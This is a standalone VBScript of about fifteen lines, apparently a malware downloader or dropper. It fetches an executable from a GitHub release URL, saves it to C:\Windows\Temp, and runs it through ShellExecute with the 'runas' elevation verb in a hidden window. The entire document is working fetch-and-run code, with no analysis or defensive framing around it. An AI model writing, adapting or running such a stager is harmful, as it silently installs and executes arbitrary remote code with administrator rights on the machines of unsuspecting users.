Dim xhr, stream, shell
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "GET", "https://github.com/kotoedoff/thunder-hub-beta/releases/download/kotoed/testapp.exe", False
xhr.Send

If xhr.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xhr.ResponseBody
    stream.SaveToFile "C:\Windows\Temp\testapp.exe", 2
    stream.Close
    
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "C:\Windows\Temp\testapp.exe", "", "", "runas", 0
End If
